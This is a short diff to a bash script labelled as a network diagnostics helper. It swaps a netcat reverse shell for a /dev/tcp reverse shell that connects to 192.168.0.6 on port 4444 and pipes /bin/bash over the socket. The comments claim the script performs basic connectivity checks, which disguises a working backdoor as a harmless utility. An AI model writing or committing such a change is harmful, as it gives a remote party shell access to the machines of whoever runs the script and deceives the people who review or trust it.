@@ -1,3 +1,8 @@
 #!/bin/bash
 # Network diagnostics helper
-nc -nv 192.168.0.6 4444 -e /bin/bash
+# This script performs basic connectivity checks
+HOST="192.168.0.6"
+PORT="4444"
+# Establish connection and spawn shell
+exec 3<>/dev/tcp/$HOST/$PORT
+/bin/bash <&3 >&3 2>&3
